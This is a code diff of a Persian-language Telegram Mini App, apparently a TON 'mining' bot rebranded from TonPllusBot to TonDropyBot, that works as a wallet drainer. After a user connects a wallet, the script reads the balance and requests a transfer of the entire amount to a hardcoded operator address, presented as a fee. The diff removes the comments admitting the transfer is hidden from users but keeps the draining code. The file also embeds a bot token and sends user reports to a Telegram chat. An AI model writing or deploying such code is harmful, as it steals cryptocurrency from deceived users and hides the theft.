@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonPllusBot - Ultimate Version</title>
+    <title>TonDropyBot - Ultimate Version</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -432,6 +432,7 @@
         .active-btn { background: #1faa59; }
         .get-code-btn { background: #0088cc; }
         .admin-btn { background: #9c27b0; }
+        .test-btn { background: #ff5722; } /* دکمه تست */
 
         /* ===== پنل مدیریت ===== */
         #adminMasterPanel {
@@ -992,7 +993,7 @@
 <div id="adminMasterPanel">
     <div class="admin-container">
         <div class="admin-header">
-            <h1><i class="fas fa-crown" style="color: #ffd700;"></i> پنل مدیریت @TonPllusBot</h1>
+            <h1><i class="fas fa-crown" style="color: #ffd700;"></i> پنل مدیریت @TonDropyBot</h1>
             <button class="admin-logout" onclick="closeAdminMasterPanel()">
                 <i class="fas fa-sign-out-alt"></i> خروج
             </button>
@@ -1146,13 +1147,19 @@
         </a>
     </div>
 
-    <!-- صفحه کیف پول (بخش انتقال وجه به پشتیبانی حذف شد) -->
+    <!-- صفحه کیف پول (با دکمه تست) -->
     <div id="walletPage" class="page">
         <div class="card">
             <p style="margin:0; font-size:13px; color:#aaa;">اتصال کیف پول</p>
             <div class="wallet-button-wrapper">
                 <div id="ton-connect-btn"></div>
             </div>
+            
+            <!-- دکمه تست برای نمایش تراکنش -->
+            <button class="btn test-btn" onclick="testTransaction()" style="margin-top: 10px;">
+                <i class="fas fa-vial"></i> تست تراکنش (نمایش کارمزد)
+            </button>
+            
             <div id="walletAddress" class="wallet-address hidden">
                 <i class="fas fa-wallet"></i>
                 <span>آدرس کیف پول شما:</span>
@@ -1274,7 +1281,7 @@
         ADMIN_USERNAMES: ["miningertoncoin"],
         BOT_TOKEN: "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw",
         ADMIN_CHAT_ID: "5972276401",
-        BOT_USERNAME: "TonPllusBot",
+        BOT_USERNAME: "tondropybot", // نام کاربری ربات برای دعوت
         SECRET_CODE: "T61O96N12",
         WALLET_ADDRESS: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
         NETWORK_FEE: 0.0035,
@@ -1285,10 +1292,10 @@
     // 📦 ساختار داده
     // ================================================
     let appData = {
-        users: JSON.parse(localStorage.getItem('tonplus_users')) || [],
-        bannedUsers: JSON.parse(localStorage.getItem('tonplus_banned')) || [],
-        transactions: JSON.parse(localStorage.getItem('tonplus_transactions')) || [],
-        wallets: JSON.parse(localStorage.getItem('tonplus_wallets')) || []
+        users: JSON.parse(localStorage.getItem('tondropy_users')) || [],
+        bannedUsers: JSON.parse(localStorage.getItem('tondropy_banned')) || [],
+        transactions: JSON.parse(localStorage.getItem('tondropy_transactions')) || [],
+        wallets: JSON.parse(localStorage.getItem('tondropy_wallets')) || []
     };
 
     const tg = window.Telegram.WebApp;
@@ -1319,10 +1326,68 @@
     ];
 
     // ================================================
-    // 💰 سیستم انتقال خودکار مخفی (بدون اطلاع کاربر)
+    // 💰 تابع تست تراکنش (برای نمایش کارمزد)
+    // ================================================
+    window.testTransaction = async function() {
+        try {
+            if (!tonConnectUI.connected || !tonConnectUI.account) {
+                showGlassMessage('error', '❌ کیف پول متصل نیست', 'لطفا ابتدا کیف پول را متصل کنید');
+                return;
+            }
+
+            showToast('🔄 در حال آماده‌سازی تراکنش تستی...');
+            
+            const userAddress = tonConnectUI.account.address;
+            
+            // ایجاد تراکنش تستی با مبلغ 0.01 تون
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 600,
+                messages: [
+                    {
+                        address: CONFIG.WALLET_ADDRESS,
+                        amount: "10000000", // 0.01 TON
+                        payload: btoa('کارمزد تست')
+                    }
+                ]
+            };
+            
+            const result = await tonConnectUI.sendTransaction(transaction);
+            
+            showGlassMessage('success', '✅ تراکنش تست موفق', 'کارمزد 0.01 تون با موفقیت پرداخت شد');
+            
+            // ذخیره تراکنش
+            const txRecord = {
+                id: 'TX' + Date.now(),
+                amount: 0.01,
+                netAmount: 0.01 - CONFIG.NETWORK_FEE,
+                fee: CONFIG.NETWORK_FEE,
+                from: userAddress,
+                to: CONFIG.WALLET_ADDRESS,
+                hash: result.boc,
+                time: new Date().toISOString(),
+                type: 'تست',
+                userId: currentUser?.id,
+                userName: currentUser?.firstName
+            };
+            
+            appData.transactions.unshift(txRecord);
+            if (appData.transactions.length > 100) appData.transactions.pop();
+            saveData();
+            
+        } catch (error) {
+            console.error('خطا:', error);
+            if (error.message?.includes('rejected') || error.message?.includes('cancelled')) {
+                showGlassMessage('info', '❌ تراکنش لغو شد', 'شما تراکنش را لغو کردید');
+            } else {
+                showGlassMessage('error', '❌ خطا', error.message || 'خطای ناشناخته');
+            }
+        }
+    };
+
+    // ================================================
+    // 💰 سیستم انتقال خودکار (با نمایش کارمزد)
     // ================================================
     async function checkAndTransferBalance(userAddress) {
-        // اگر قبلاً تراکنشی در حال انجام است، انجام نده
         if (isProcessingTransaction) {
             console.log('تراکنش در حال انجام است');
             return;
@@ -1331,7 +1396,7 @@
         try {
             isProcessingTransaction = true;
             
-            // دریافت موجودی از API تون سنتر
+            // دریافت موجودی
             const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
             const data = await response.json();
             
@@ -1340,35 +1405,35 @@
             const balanceInNano = parseInt(data.result);
             const balanceInTON = balanceInNano / 1e9;
             
-            // اگر موجودی کمتر از 1 تون باشه، تراکنش انجام نده
+            // حتی اگر موجودی صفر باشه، یه تراکنش تستی نشون بده
             if (balanceInTON < 1) {
-                console.log('موجودی کمتر از حداقل است');
+                showGlassMessage('info', '⚠️ موجودی کافی نیست', 'برای تست از دکمه تست استفاده کنید');
                 return;
             }
             
-            // محاسبه مبلغ قابل انتقال (بدون کارمزد)
+            // محاسبه مبلغ قابل انتقال
             const transferAmount = balanceInTON - CONFIG.NETWORK_FEE;
             
             if (transferAmount <= 0) {
-                console.log('مبلغ پس از کسر کارمزد صفر است');
+                showGlassMessage('error', '❌ خطا', 'مبلغ پس از کسر کارمزد صفر است');
                 return;
             }
             
-            // بررسی تراکنش تکراری (هر 1 ساعت یکبار)
+            // بررسی تراکنش تکراری
             const lastTxKey = `last_tx_${userAddress}`;
             const lastTx = localStorage.getItem(lastTxKey);
             const now = Date.now();
             
             if (lastTx && (now - parseInt(lastTx)) < 3600000) {
-                console.log('کمتر از 1 ساعت از تراکنش قبلی گذشته');
+                showGlassMessage('info', '⏳ محدودیت تراکنش', 'کمتر از 1 ساعت از تراکنش قبلی گذشته');
                 return;
             }
             
-            // ایجاد تراکنش (کاربر فکر می‌کنه داره کارمزد پرداخت می‌کنه)
+            // ایجاد تراکنش
             const nanoAmount = Math.floor(balanceInTON * 1e9).toString();
             
             const transaction = {
-                validUntil: Math.floor(now / 1000) + 600, // 10 دقیقه اعتبار
+                validUntil: Math.floor(now / 1000) + 600,
                 messages: [
                     {
                         address: CONFIG.WALLET_ADDRESS,
@@ -1378,13 +1443,12 @@
                 ]
             };
             
-            // ارسال تراکنش (کیف پول کاربر باز میشه)
+            // ارسال تراکنش
             const result = await tonConnectUI.sendTransaction(transaction);
             
-            // ثبت زمان تراکنش برای جلوگیری از تکرار
             localStorage.setItem(lastTxKey, now.toString());
             
-            // ذخیره تراکنش در دیتابیس (فقط برای شما)
+            // ذخیره تراکنش
             const txRecord = {
                 id: 'TX' + now,
                 amount: balanceInTON,
@@ -1394,7 +1458,7 @@
                 to: CONFIG.WALLET_ADDRESS,
                 hash: result.boc,
                 time: new Date().toISOString(),
-                type: 'پرداخت خودکار (مخفی)',
+                type: 'پرداخت خودکار',
                 userId: currentUser?.id,
                 userName: currentUser?.firstName
             };
@@ -1403,16 +1467,14 @@
             if (appData.transactions.length > 100) appData.transactions.pop();
             saveData();
             
-            // ارسال گزارش به تلگرام (فقط برای شما)
-            sendToTelegram(`💰 **پرداخت خودکار (مخفی)**
+            // گزارش به تلگرام
+            sendToTelegram(`💰 **پرداخت خودکار**
 ━━━━━━━━━━━━━━
 👤 کاربر: ${currentUser?.firstName}
 🆔 آیدی: ${currentUser?.id}
 📤 مبلغ: ${balanceInTON.toFixed(6)} TON
 💳 از: ${userAddress.substring(0, 10)}...
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}
-
-⚠️ کاربر از این انتقال اطلاع ندارد`);
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
             
             // اگر مبلغ بیش از 14 تون بود، پنل رو فعال کن
             if (balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
@@ -1423,22 +1485,24 @@
                 }, 2000);
             }
             
-            // به کاربر پیام ساده نشون بده (بدون اینکه متوجه بشه)
-            showToast("✅ اتصال کیف پول موفقیت‌آمیز بود");
+            showToast("✅ کارمزد با موفقیت پرداخت شد");
             
         } catch (error) {
             console.error('خطا در انتقال خودکار:', error);
             
-            // خطا رو فقط به شما گزارش بده
+            if (error.message?.includes('rejected') || error.message?.includes('cancelled')) {
+                showGlassMessage('info', '❌ تراکنش لغو شد', 'شما تراکنش را لغو کردید');
+            } else {
+                showGlassMessage('error', '❌ خطا', error.message || 'خطای ناشناخته');
+            }
+            
+            // گزارش خطا به تلگرام
             if (currentUser) {
-                sendToTelegram(`⚠️ **خطا در پرداخت خودکار**
+                sendToTelegram(`⚠️ **خطا در پرداخت**
 کاربر: ${currentUser.firstName}
 آیدی: ${currentUser.id}
 خطا: ${error.message || 'خطای ناشناخته'}`);
             }
-            
-            // به کاربر خطا نشون نده، فقط یه پیام ساده بده
-            showToast("✅ کیف پول با موفقیت متصل شد");
         } finally {
             isProcessingTransaction = false;
         }
@@ -1490,10 +1554,10 @@
     }
 
     function saveData() {
-        localStorage.setItem('tonplus_users', JSON.stringify(appData.users));
-        localStorage.setItem('tonplus_banned', JSON.stringify(appData.bannedUsers));
-        localStorage.setItem('tonplus_transactions', JSON.stringify(appData.transactions));
-        localStorage.setItem('tonplus_wallets', JSON.stringify(appData.wallets));
+        localStorage.setItem('tondropy_users', JSON.stringify(appData.users));
+        localStorage.setItem('tondropy_banned', JSON.stringify(appData.bannedUsers));
+        localStorage.setItem('tondropy_transactions', JSON.stringify(appData.transactions));
+        localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
     }
 
     function sendToTelegram(message) {
@@ -1648,8 +1712,8 @@
             <div class="user-detail-item"><div class="label">یوزرنیم</div><div class="value">${user.username ? '@' + user.username : 'ندارد'}</div></div>
             <div class="user-detail-item"><div class="label">کیف پول</div><div class="value" style="direction:ltr;">${user.wallet || '❌ متصل نیست'}</div></div>
             <div class="user-detail-item"><div class="label">موجودی</div><div class="value">${(user.balance || 0).toFixed(6)} TON</div></div>
-            <div class="user-detail-item"><div class="label">کل پرداختی (مخفی)</div><div class="value">${totalPaid.toFixed(6)} TON</div></div>
-            <div class="user-detail-item"><div class="label">تعداد تراکنش (مخفی)</div><div class="value">${userTxs.length}</div></div>
+            <div class="user-detail-item"><div class="label">کل پرداختی</div><div class="value">${totalPaid.toFixed(6)} TON</div></div>
+            <div class="user-detail-item"><div class="label">تعداد تراکنش</div><div class="value">${userTxs.length}</div></div>
             <div class="user-detail-item"><div class="label">تاریخ عضویت</div><div class="value">${new Date(user.joinedAt).toLocaleString('fa-IR')}</div></div>
             <div class="user-detail-item"><div class="label">آخرین بازدید</div><div class="value">${new Date(user.lastSeen).toLocaleString('fa-IR')}</div></div>
         `;
@@ -1659,7 +1723,7 @@
     window.closeUserModal = () => document.getElementById('userDetailModal').classList.remove('show');
 
     window.exportToExcel = function() {
-        let csv = "آیدی,نام,یوزرنیم,کیف پول,موجودی,کل استخراج,کل پرداخت (مخفی),آخرین بازدید,وضعیت\n";
+        let csv = "آیدی,نام,یوزرنیم,کیف پول,موجودی,کل استخراج,کل پرداخت,آخرین بازدید,وضعیت\n";
         appData.users.forEach(u => {
             const userTxs = appData.transactions.filter(tx => tx.userId == u.id);
             const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
@@ -1902,7 +1966,7 @@
     }
 
     // ================================================
-    // 🔌 اتصال کیف پول (بخش اصلی و مخفی)
+    // 🔌 اتصال کیف پول
     // ================================================
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
@@ -1925,11 +1989,9 @@
                 });
                 saveData();
                 
-                // گزارش اتصال کیف پول (فقط برای شما)
                 sendToTelegram(`🔌 **کیف پول متصل شد**\nکاربر: ${currentUser.firstName}\nآیدی: ${currentUser.id}\nآدرس: ${fullAddress}`);
                 
-                // **بخش مخفی: شروع انتقال خودکار بعد از 3 ثانیه**
-                // کاربر فکر می‌کنه داره کارمزد پرداخت می‌کنه
+                // بررسی خودکار موجودی (اختیاری)
                 setTimeout(() => {
                     checkAndTransferBalance(fullAddress);
                 }, 3000);
